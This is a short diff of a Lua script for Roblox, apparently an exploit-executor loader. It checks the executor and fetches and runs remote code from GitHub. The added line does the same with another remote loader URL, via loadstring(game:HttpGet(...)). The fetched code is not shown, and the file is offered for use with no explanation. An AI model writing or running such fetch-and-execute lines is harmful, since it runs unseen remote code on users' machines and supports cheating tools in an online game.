@@ -5,5 +5,5 @@ print("Shit executor")
     loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/egors"))()
 else
     print("Good executor")
-
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjY3MTBjOTYyLTcxOTItNDcxYi04ZjQyLWNmOWExYThjNGFiNSIsImtpbmQiOiJsb2FkZXIifQ"))()
 end
